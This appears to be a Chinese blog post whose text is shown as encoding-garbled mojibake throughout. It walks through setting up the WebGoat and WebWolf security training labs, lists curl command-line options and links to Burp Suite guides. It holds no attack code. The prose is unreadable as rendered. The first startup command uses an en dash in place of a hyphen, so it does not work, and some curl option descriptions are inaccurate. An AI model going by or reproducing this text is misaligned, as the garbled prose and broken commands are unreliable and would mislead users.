<p>å»gitä¸Šä¸‹è½½Webgoatå’ŒWebwolfï¼ˆåªéœ€è¦webgoat-server-xxx.jar å’Œ webwolf-xxx.jarå°±è¡Œäº†ï¼Œä¸‹è½½åè®°å¾—æ”¾åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼Œæœ€å¥½è·¯å¾„æ²¡ä¸­æ–‡ï¼Œè™½ç„¶æœ‰ä¸­æ–‡ä¹Ÿèƒ½å¯åŠ¨ï¼Œä½†æ˜¯å…»å¥½ä¹ æƒ¯ï¼‰</p>
<p><a target="_blank" rel="noopener" href="https://github.com/WebGoat/WebGoat/releases">é“¾æ¥ç›´è¾¾</a></p>
<p>è‡ªè¡Œé€‰æ‹©ç‰ˆæœ¬ï¼Œæˆ‘é€‰æ‹©çš„æ˜¯<strong>8.2.2</strong></p>
<p>å»<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=oracle&amp;spm=1001.2101.3001.7020">oracle</a>å®˜ç½‘ä¸‹è½½ï¼ˆæ³¨æ„ç‰ˆæœ¬é—®é¢˜ï¼Œç‰ˆæœ¬ä¸åŒ¹é…ä¼šæŠ¥é”™ï¼Œ8.2.2éœ€è¦jdk&gt;15)ä¸‹é¢æ˜¯jdk17ï¼Œç„¶åè®°å¾—é…ç½®ç¯å¢ƒå˜é‡</p>
<p><a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html">é“¾æ¥ç›´è¾¾</a></p>
<p>å¯åŠ¨å‘½ä»¤</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java â€“jar webgoat-server-8.2.2.jar --server.port=8080 # å¯åŠ¨webgoatè¿™é‡Œå¼€æ”¾ç«¯å£æ˜¯8080ï¼Œæ ¹æ®è‡ªå·±éœ€æ±‚è‡ªå·±æ”¹</span><br><span class="line">java -jar -Dfile.encoding=UTF-8 webwolf-8.2.2.jar --server.port=9090 # å¯åŠ¨webwolfè¿™é‡Œå¼€æ”¾ç«¯å£æ˜¯9090ï¼Œæ ¹æ®è‡ªå·±éœ€æ±‚è‡ªå·±æ”¹</span><br></pre></td></tr></table></figure>
<p>å¯åŠ¨åè¿›å…¥æµè§ˆå™¨è¾“å…¥(æ³¨æ„å¤§å°ã€‚ã€‚ã€‚)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">localhost:8080/WebGoat/</span><br><span class="line">localhost:9090/WebWolf/</span><br></pre></td></tr></table></figure>
<p>WebGoatä¼šè‡ªåŠ¨è·³è½¬åˆ°loginï¼Œè‡ªè¡Œæ³¨å†Œå°±è¡Œäº†ï¼ŒWebWolfç”¨çš„æ˜¯WebGoatçš„è´¦å·å¯†ç </p>
<blockquote>
<p>å› ä¸ºé¢˜ç›®å…¨æ˜¯è‹±æ ¼åŠ›å£«ï¼Œæˆ‘æ˜¯ç”¨edgeæµè§ˆå™¨è‡ªå¸¦ç¿»è¯‘åŠŸèƒ½</p>
<p>å› ä¸ºåšä¸»æœ‰åˆ·å…¶ä»–é¶åœºçš„ç»éªŒï¼Œæœ¬é¶åœºä»…ä»…ä½œä¸ºåšä¸»çš„ç¬”è®°</p>
<p>å› æ­¤å¤§éƒ¨åˆ†åªæœ‰ç­”æ¡ˆè¿‡ç¨‹å¯èƒ½å¹¶ä¸è¯¦ç»†ï¼Œå¹¶ä¸”åªåœ¨éœ€è¦æ‰ä¼šç»™å‡ºæ­¥éª¤å›¾ç‰‡ï¼ˆæ‡’ï¼‰</p>
<p>ä½†æ˜¯æˆ‘ä¼šåœ¨æ­¥éª¤å’Œä»£ç çš„éƒ¨åˆ†å°½é‡è§£è¯»ï¼ˆå› ä¸ºå¦‚æœæˆ‘ä¹Ÿçœ‹ä¸æ‡‚ï¼Œæˆ‘ä¼šèŠ±åŠŸå¤«è®²é€ğŸ˜­ï¼‰</p>
</blockquote>
<p>å‚è€ƒèµ„æ–™ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37138074/article/details/128930146">WebGoat-8.2.2ç‰ˆé¶æœºå­¦ä¹ æ€»ç»“_webgoat8.2.2-CSDNåšå®¢</a></p>
<h2 id="å¸¸ç”¨å‘½ä»¤å’Œå·¥å…·">å¸¸ç”¨å‘½ä»¤å’Œå·¥å…·</h2>
<p>è¿™é‡Œå…ˆç»™å‡ºè§£é¢˜æ¯”è¾ƒå¸¸ç”¨çš„å‘½ä»¤å’Œå·¥å…·ï¼ˆå½“ç„¶æ¯é¢˜çš„è§£æ³•å¤šç§å¤šæ ·ï¼Œæœ¬äººå°ç™½ä¸€ä¸ªï¼Œæˆ‘ä¼šå°½åŠ›å»æ‰¾æ›´å¤šçš„è§£æ³•çš„ï¼Œå¦‚æœ‰ä¸å…¨ï¼Œè¯·å¤šåŒ…æ¶µï¼‰</p>
<blockquote>
<p>å› ä¸ºè¿™é‡Œè¦ç”¨çš„å·¥å…·æˆ‘éƒ½è‡ªå·±æœ‰ï¼Œéœ€è¦çš„è¯„è®ºå°±è¡Œ</p>
</blockquote>
<h3 id="0-ç¿»è¯‘è½¯ä»¶">0.ç¿»è¯‘è½¯ä»¶</h3>
<p>å› ä¸ºWebGoatéƒ½æ˜¯è‹±æ ¼åŠ›å£«ï¼Œå¯¹äºæˆ‘è¿™ç§è‹±è¯­ä¸æ€ä¹ˆè¡Œçš„è¿˜æ˜¯å¾—ç”¨ç¿»è¯‘</p>
<p>æˆ‘æ²¡æœ‰ç”¨gooleï¼Œè¿™é‡Œæˆ‘åªè¯´edgeå’Œç«ç‹</p>
<p>edgeè‡ªå¸¦ç¿»è¯‘åŠŸèƒ½ï¼ŒæŒºå¥½ç”¨çš„ï¼Œä½†æ˜¯é…åˆburpä¸å¦‚ç«ç‹ç®€å•ï¼ˆåæ­£æˆ‘æ²¡æœ‰é…å¥½å°±ç®—äº†ï¼‰</p>
<p>ç«ç‹éœ€è¦ä¸‹è½½æ’ä»¶ï¼Œè¿™é‡Œæˆ‘æ¨è<code>twp</code>ï¼ˆTranslate Web Pages),ç¿»è¯‘é€Ÿåº¦è¿˜è¡Œï¼ˆè´¨é‡ä¹Ÿå°±é‚£æ ·ï¼Œæ‰€ä»¥ç¿»è¯‘è‹±æ ¼åŠ›å£«çš„èƒ½åŠ›è¿˜æ˜¯å¾—æœ‰çš„ğŸ˜¥ï¼‰</p>
<p><s>ä½†æ˜¯æˆ‘æœ€æ¨èçš„æ˜¯è‹±è¯­å’Œç¿»è¯‘ä¸€èµ·çœ‹ï¼Œä¼šæ¯”è¾ƒæ˜æœ—</s></p>
<h3 id="1-curl">1.curl</h3>
<p>è¯¦æƒ…è¯·ç‚¹å‡»<a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html">è¿™é‡Œ</a></p>
<p>è¿™é‡Œç»™å‡ºç®€å•çš„å‘½ä»¤é›†åˆ</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line">-a/--append ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œé™„åŠ åˆ°ç›®æ ‡æ–‡ä»¶  </span><br><span class="line"></span><br><span class="line"> -A/--user-agent &lt;string&gt; è®¾ç½®ç”¨æˆ·ä»£ç†å‘é€ç»™æœåŠ¡å™¨  </span><br><span class="line"></span><br><span class="line"> --anyauth å¯ä»¥ä½¿ç”¨â€œä»»ä½•â€èº«ä»½éªŒè¯æ–¹æ³•  </span><br><span class="line"></span><br><span class="line"> -b/--cookie &lt;name=string/file&gt; cookie å­—ç¬¦ä¸²æˆ–æ–‡ä»¶è¯»å–ä½ç½®  </span><br><span class="line"></span><br><span class="line"> --basic ä½¿ç”¨ HTTP åŸºæœ¬éªŒè¯  </span><br><span class="line"></span><br><span class="line"> -B/--use-ascii ä½¿ç”¨ ASCII /æ–‡æœ¬ä¼ è¾“  </span><br><span class="line"></span><br><span class="line"> -c/--cookie-jar &lt;file&gt; æ“ä½œç»“æŸåæŠŠ cookie å†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­  </span><br><span class="line"></span><br><span class="line"> -C/--continue-at &lt;offset&gt; æ–­ç‚¹ç»­è½¬  </span><br><span class="line"></span><br><span class="line"> -d/--data &lt;data&gt; HTTP POST æ–¹å¼ä¼ é€æ•°æ®  </span><br><span class="line"></span><br><span class="line"> --data-ascii &lt;data&gt; ä»¥ ascii çš„æ–¹å¼ post æ•°æ®  </span><br><span class="line"></span><br><span class="line"> --data-binary &lt;data&gt; ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼ post æ•°æ®  </span><br><span class="line"></span><br><span class="line"> --negotiate ä½¿ç”¨ HTTP èº«ä»½éªŒè¯  </span><br><span class="line"></span><br><span class="line"> --digest ä½¿ç”¨æ•°å­—èº«ä»½éªŒè¯  </span><br><span class="line"></span><br><span class="line"> --disable-eprt ç¦æ­¢ä½¿ç”¨ EPRT æˆ– LPRT  </span><br><span class="line"></span><br><span class="line"> --disable-epsv ç¦æ­¢ä½¿ç”¨ EPSV  </span><br><span class="line"></span><br><span class="line"> -D/--dump-header &lt;file&gt; æŠŠ header ä¿¡æ¯å†™å…¥åˆ°è¯¥æ–‡ä»¶ä¸­  </span><br><span class="line"></span><br><span class="line"> --egd-file &lt;file&gt; ä¸ºéšæœºæ•°æ®(SSL)è®¾ç½® EGD socket è·¯å¾„  </span><br><span class="line"></span><br><span class="line"> --tcp-nodelay ä½¿ç”¨ TCP_NODELAY é€‰é¡¹  </span><br><span class="line"></span><br><span class="line"> -e/--referer æ¥æºç½‘å€  </span><br><span class="line"></span><br><span class="line"> -E/--cert &lt;cert[:passwd]&gt; å®¢æˆ·ç«¯è¯ä¹¦æ–‡ä»¶å’Œå¯†ç  (SSL)  </span><br><span class="line"></span><br><span class="line"> --cert-type &lt;type&gt; è¯ä¹¦æ–‡ä»¶ç±»å‹ (DER/PEM/ENG) (SSL)  </span><br><span class="line"></span><br><span class="line"> --key &lt;key&gt; ç§é’¥æ–‡ä»¶å (SSL)  </span><br><span class="line"></span><br><span class="line"> --key-type &lt;type&gt; ç§é’¥æ–‡ä»¶ç±»å‹ (DER/PEM/ENG) (SSL)  </span><br><span class="line"></span><br><span class="line"> --pass &lt;pass&gt; ç§é’¥å¯†ç  (SSL)  </span><br><span class="line"></span><br><span class="line"> --engine &lt;eng&gt; åŠ å¯†å¼•æ“ä½¿ç”¨ (SSL). &quot;--engine list&quot; for list  </span><br><span class="line"></span><br><span class="line"> --cacert &lt;file&gt; CA è¯ä¹¦ (SSL)  </span><br><span class="line"></span><br><span class="line"> --capath &lt;directory&gt; CA ç›®å½• (made using c_rehash) to verify peer against (SSL)  </span><br><span class="line"></span><br><span class="line"> --ciphers &lt;list&gt; SSL å¯†ç   </span><br><span class="line"></span><br><span class="line"> --compressed è¦æ±‚è¿”å›æ˜¯å‹ç¼©çš„å½¢åŠ¿ (using deflate or gzip)  </span><br><span class="line"></span><br><span class="line"> --connect-timeout &lt;seconds&gt; è®¾ç½®æœ€å¤§è¯·æ±‚æ—¶é—´  </span><br><span class="line"></span><br><span class="line"> --create-dirs å»ºç«‹æœ¬åœ°ç›®å½•çš„ç›®å½•å±‚æ¬¡ç»“æ„  </span><br><span class="line"></span><br><span class="line"> --crlf ä¸Šä¼ æ˜¯æŠŠ LF è½¬å˜æˆ CRLF  </span><br><span class="line"></span><br><span class="line"> -f/--fail è¿æ¥å¤±è´¥æ—¶ä¸æ˜¾ç¤º http é”™è¯¯  </span><br><span class="line"></span><br><span class="line"> --ftp-create-dirs å¦‚æœè¿œç¨‹ç›®å½•ä¸å­˜åœ¨ï¼Œåˆ›å»ºè¿œç¨‹ç›®å½•  </span><br><span class="line"></span><br><span class="line"> --ftp-method [multicwd/nocwd/singlecwd] æ§åˆ¶ CWD çš„ä½¿ç”¨  </span><br><span class="line"></span><br><span class="line"> --ftp-pasv ä½¿ç”¨ PASV/EPSV ä»£æ›¿ç«¯å£  </span><br><span class="line"></span><br><span class="line"> --ftp-skip-pasv-ip ä½¿ç”¨ PASV çš„æ—¶å€™,å¿½ç•¥è¯¥ IP åœ°å€  </span><br><span class="line"></span><br><span class="line"> --ftp-ssl å°è¯•ç”¨ SSL/TLS æ¥è¿›è¡Œ ftp æ•°æ®ä¼ è¾“  </span><br><span class="line"></span><br><span class="line"> --ftp-ssl-reqd è¦æ±‚ç”¨ SSL/TLS æ¥è¿›è¡Œ ftp æ•°æ®ä¼ è¾“  </span><br><span class="line"></span><br><span class="line"> -F/--form &lt;name=content&gt; æ¨¡æ‹Ÿ http è¡¨å•æäº¤æ•°æ®  </span><br><span class="line"></span><br><span class="line"> -form-string &lt;name=string&gt; æ¨¡æ‹Ÿ http è¡¨å•æäº¤æ•°æ®  </span><br><span class="line"></span><br><span class="line"> -g/--globoff ç¦ç”¨ç½‘å€åºåˆ—å’ŒèŒƒå›´ä½¿ç”¨&#123;&#125;å’Œ[]  </span><br><span class="line"></span><br><span class="line"> -G/--get ä»¥ get çš„æ–¹å¼æ¥å‘é€æ•°æ®  </span><br><span class="line"></span><br><span class="line"> -h/--help å¸®åŠ©  </span><br><span class="line"></span><br><span class="line"> -H/--header &lt;line&gt;è‡ªå®šä¹‰å¤´ä¿¡æ¯ä¼ é€’ç»™æœåŠ¡å™¨  </span><br><span class="line"></span><br><span class="line"> --ignore-content-length å¿½ç•¥çš„ HTTP å¤´ä¿¡æ¯çš„é•¿åº¦  </span><br><span class="line"></span><br><span class="line"> -i/--include è¾“å‡ºæ—¶åŒ…æ‹¬ protocol å¤´ä¿¡æ¯  </span><br><span class="line"></span><br><span class="line"> -I/--head åªæ˜¾ç¤ºæ–‡æ¡£ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">-j/--junk-session-cookies è¯»å–æ–‡ä»¶è¿›å¿½ç•¥ session cookie  </span><br><span class="line"></span><br><span class="line"> --interface &lt;interface&gt; ä½¿ç”¨æŒ‡å®šç½‘ç»œæ¥å£/åœ°å€  </span><br><span class="line"></span><br><span class="line"> --krb4 &lt;level&gt; ä½¿ç”¨æŒ‡å®šå®‰å…¨çº§åˆ«çš„ krb4  </span><br><span class="line"></span><br><span class="line"> -k/--insecure å…è®¸ä¸ä½¿ç”¨è¯ä¹¦åˆ° SSL ç«™ç‚¹  </span><br><span class="line"></span><br><span class="line"> -K/--config æŒ‡å®šçš„é…ç½®æ–‡ä»¶è¯»å–  </span><br><span class="line"></span><br><span class="line"> -l/--list-only åˆ—å‡º ftp ç›®å½•ä¸‹çš„æ–‡ä»¶åç§°  </span><br><span class="line"></span><br><span class="line"> --limit-rate &lt;rate&gt; è®¾ç½®ä¼ è¾“é€Ÿåº¦  </span><br><span class="line"></span><br><span class="line"> --local-port&lt;NUM&gt; å¼ºåˆ¶ä½¿ç”¨æœ¬åœ°ç«¯å£å·  </span><br><span class="line"></span><br><span class="line"> -m/--max-time &lt;seconds&gt; è®¾ç½®æœ€å¤§ä¼ è¾“æ—¶é—´  </span><br><span class="line"></span><br><span class="line"> --max-redirs &lt;num&gt; è®¾ç½®æœ€å¤§è¯»å–çš„ç›®å½•æ•°  </span><br><span class="line"></span><br><span class="line"> --max-filesize &lt;bytes&gt; è®¾ç½®æœ€å¤§ä¸‹è½½çš„æ–‡ä»¶æ€»é‡  </span><br><span class="line"></span><br><span class="line"> -M/--manual æ˜¾ç¤ºå…¨æ‰‹åŠ¨  </span><br><span class="line"></span><br><span class="line"> -n/--netrc ä» netrc æ–‡ä»¶ä¸­è¯»å–ç”¨æˆ·åå’Œå¯†ç   </span><br><span class="line"></span><br><span class="line"> --netrc-optional ä½¿ç”¨ .netrc æˆ–è€… URL æ¥è¦†ç›–-n  </span><br><span class="line"></span><br><span class="line"> --ntlm ä½¿ç”¨ HTTP NTLM èº«ä»½éªŒè¯  </span><br><span class="line"></span><br><span class="line"> -N/--no-buffer ç¦ç”¨ç¼“å†²è¾“å‡º  </span><br><span class="line"></span><br><span class="line"> -o/--output æŠŠè¾“å‡ºå†™åˆ°è¯¥æ–‡ä»¶ä¸­  </span><br><span class="line"></span><br><span class="line"> -O/--remote-name æŠŠè¾“å‡ºå†™åˆ°è¯¥æ–‡ä»¶ä¸­ï¼Œä¿ç•™è¿œç¨‹æ–‡ä»¶çš„æ–‡ä»¶å  </span><br><span class="line"></span><br><span class="line"> -p/--proxytunnel ä½¿ç”¨ HTTP ä»£ç†  </span><br><span class="line"></span><br><span class="line"> --proxy-anyauth é€‰æ‹©ä»»ä¸€ä»£ç†èº«ä»½éªŒè¯æ–¹æ³•  </span><br><span class="line"></span><br><span class="line"> --proxy-basic åœ¨ä»£ç†ä¸Šä½¿ç”¨åŸºæœ¬èº«ä»½éªŒè¯  </span><br><span class="line"></span><br><span class="line"> --proxy-digest åœ¨ä»£ç†ä¸Šä½¿ç”¨æ•°å­—èº«ä»½éªŒè¯  </span><br><span class="line"></span><br><span class="line"> --proxy-ntlm åœ¨ä»£ç†ä¸Šä½¿ç”¨ ntlm èº«ä»½éªŒè¯  </span><br><span class="line"></span><br><span class="line"> -P/--ftp-port &lt;address&gt; ä½¿ç”¨ç«¯å£åœ°å€ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ PASV  </span><br><span class="line"></span><br><span class="line"> -Q/--quote &lt;cmd&gt;æ–‡ä»¶ä¼ è¾“å‰ï¼Œå‘é€å‘½ä»¤åˆ°æœåŠ¡å™¨  </span><br><span class="line"></span><br><span class="line"> -r/--range &lt;range&gt;æ£€ç´¢æ¥è‡ª HTTP/1.1 æˆ– FTP æœåŠ¡å™¨å­—èŠ‚èŒƒå›´  </span><br><span class="line"></span><br><span class="line"> --range-file è¯»å–ï¼ˆSSLï¼‰çš„éšæœºæ–‡ä»¶  </span><br><span class="line"></span><br><span class="line"> -R/--remote-time åœ¨æœ¬åœ°ç”Ÿæˆæ–‡ä»¶æ—¶ï¼Œä¿ç•™è¿œç¨‹æ–‡ä»¶æ—¶é—´  </span><br><span class="line"></span><br><span class="line"> --retry &lt;num&gt; ä¼ è¾“å‡ºç°é—®é¢˜æ—¶ï¼Œé‡è¯•çš„æ¬¡æ•°  </span><br><span class="line"></span><br><span class="line"> --retry-delay &lt;seconds&gt; ä¼ è¾“å‡ºç°é—®é¢˜æ—¶ï¼Œè®¾ç½®é‡è¯•é—´éš”æ—¶é—´  </span><br><span class="line"></span><br><span class="line"> --retry-max-time &lt;seconds&gt; ä¼ è¾“å‡ºç°é—®é¢˜æ—¶ï¼Œè®¾ç½®æœ€å¤§é‡è¯•æ—¶é—´  </span><br><span class="line"></span><br><span class="line"> -s/--silent é™éŸ³æ¨¡å¼ã€‚ä¸è¾“å‡ºä»»ä½•ä¸œè¥¿  </span><br><span class="line"></span><br><span class="line"> -S/--show-error æ˜¾ç¤ºé”™è¯¯  </span><br><span class="line"></span><br><span class="line"> --socks4 &lt;host[:port]&gt; ç”¨ socks4 ä»£ç†ç»™å®šä¸»æœºå’Œç«¯å£  </span><br><span class="line"></span><br><span class="line"> --socks5 &lt;host[:port]&gt; ç”¨ socks5 ä»£ç†ç»™å®šä¸»æœºå’Œç«¯å£  </span><br><span class="line"></span><br><span class="line"> --stderr &lt;file&gt;  </span><br><span class="line"></span><br><span class="line"> -t/--telnet-option &lt;OPT=val&gt; Telnet é€‰é¡¹è®¾ç½®  </span><br><span class="line"></span><br><span class="line"> --trace &lt;file&gt; å¯¹æŒ‡å®šæ–‡ä»¶è¿›è¡Œ debug  </span><br><span class="line"></span><br><span class="line"> --trace-ascii &lt;file&gt; Like --è·Ÿè¸ªä½†æ²¡æœ‰ hex è¾“å‡º  </span><br><span class="line"></span><br><span class="line"> --trace-time è·Ÿè¸ª/è¯¦ç»†è¾“å‡ºæ—¶ï¼Œæ·»åŠ æ—¶é—´æˆ³  </span><br><span class="line"></span><br><span class="line"> -T/--upload-file &lt;file&gt; ä¸Šä¼ æ–‡ä»¶  </span><br><span class="line"></span><br><span class="line"> --url &lt;URL&gt; Spet URL to work with  </span><br><span class="line"></span><br><span class="line"> -u/--user &lt;user[:password]&gt;è®¾ç½®æœåŠ¡å™¨çš„ç”¨æˆ·å’Œå¯†ç   </span><br><span class="line"></span><br><span class="line"> -U/--proxy-user &lt;user[:password]&gt;è®¾ç½®ä»£ç†ç”¨æˆ·åå’Œå¯†ç   </span><br><span class="line"></span><br><span class="line"> -v/--verbose  </span><br><span class="line"></span><br><span class="line"> -V/--version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯  </span><br><span class="line"></span><br><span class="line"> -w/--write-out [format]ä»€ä¹ˆè¾“å‡ºå®Œæˆå  </span><br><span class="line"></span><br><span class="line"> -x/--proxy &lt;host[:port]&gt;åœ¨ç»™å®šçš„ç«¯å£ä¸Šä½¿ç”¨ HTTP ä»£ç†  </span><br><span class="line"></span><br><span class="line"> -X/--request &lt;command&gt;æŒ‡å®šä»€ä¹ˆå‘½ä»¤  </span><br><span class="line"></span><br><span class="line"> -y/--speed-time æ”¾å¼ƒé™é€Ÿæ‰€è¦çš„æ—¶é—´ã€‚é»˜è®¤ä¸º 30  </span><br><span class="line"></span><br><span class="line"> -Y/--speed-limit åœæ­¢ä¼ è¾“é€Ÿåº¦çš„é™åˆ¶ï¼Œé€Ÿåº¦æ—¶é—´&#x27;ç§’  </span><br><span class="line"></span><br><span class="line"> -z/--time-cond ä¼ é€æ—¶é—´è®¾ç½®  </span><br><span class="line"></span><br><span class="line"> -0/--http1.0 ä½¿ç”¨ HTTP 1.0  </span><br><span class="line"></span><br><span class="line"> -1/--tlsv1 ä½¿ç”¨ TLSv1ï¼ˆSSLï¼‰  </span><br><span class="line"></span><br><span class="line"> -2/--sslv2 ä½¿ç”¨ SSLv2 çš„ï¼ˆSSLï¼‰  </span><br><span class="line"></span><br><span class="line"> -3/--sslv3 ä½¿ç”¨çš„ SSLv3ï¼ˆSSLï¼‰  </span><br><span class="line"></span><br><span class="line"> --3p-quote like -Q for the source URL for 3rd party transfer  </span><br><span class="line"></span><br><span class="line"> --3p-url ä½¿ç”¨ urlï¼Œè¿›è¡Œç¬¬ä¸‰æ–¹ä¼ é€  </span><br><span class="line"></span><br><span class="line"> --3p-user ä½¿ç”¨ç”¨æˆ·åå’Œå¯†ç ï¼Œè¿›è¡Œç¬¬ä¸‰æ–¹ä¼ é€  </span><br><span class="line"></span><br><span class="line"> -4/--ipv4 ä½¿ç”¨ IP4  </span><br><span class="line"></span><br><span class="line"> -6/--ipv6 ä½¿ç”¨ IP6  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"> -#</span><span class="language-bash">/--progress-bar ç”¨è¿›åº¦æ¡æ˜¾ç¤ºå½“å‰çš„ä¼ é€çŠ¶æ€</span></span><br><span class="line"></span><br><span class="line">â€”â€”â€”â€”</span><br><span class="line"></span><br><span class="line">åç½®ï¼š</span><br><span class="line"></span><br><span class="line">-v æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼ˆverbose ç¼©å†™ï¼‰ï¼ŒåŒ…æ‹¬ IP è§£æè¿‡ç¨‹</span><br><span class="line"></span><br><span class="line">-i æ˜¾ç¤ºå¤´ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">-I åªæ˜¾ç¤ºå¤´ä¿¡æ¯</span><br></pre></td></tr></table></figure>
<h3 id="2-burp">2.burp</h3>
<p>è¿™ä¸ªå¾ˆæœ‰ç”¨ï¼Œé›†æ¸—é€ï¼Œçˆ†ç ´ç­‰ç­‰ä¸€ç³»åˆ—æ¨¡å—çš„è½¯ä»¶ï¼Œè¿™é‡Œä¸å¤šä»‹ç»ï¼Œæœ‰å…´è¶£å¯ä»¥å»çœ‹å›½äººå†™çš„ä»‹ç» ğŸ‘‰<a target="_blank" rel="noopener" href="https://t0data.gitbooks.io/burpsuite/content/">Burp Suite å®æˆ˜æŒ‡å—</a></p>
<blockquote>
<p>è½¯ä»¶æ²¡æœ‰çš„è¯æ‡’å¾—å»æ‰¾å¯ä»¥ç•™è¨€æ‰¾æˆ‘ï¼Œburp å®æˆ˜æŒ‡å— pdf ç‰ˆæˆ‘ä¹Ÿæœ‰</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/crisprx/article/details/104181954">å¦‚ä½•è®¾ç½®burpç›‘å¬webgoat</a></p>
<p>ä¸»è¦æ­¥éª¤ï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/crisprx/article/details/104181954">burpsuiteæ— æ³•æ•æ‰localhoståŒ…çš„è§£å†³æ–¹æ³•</a></p>
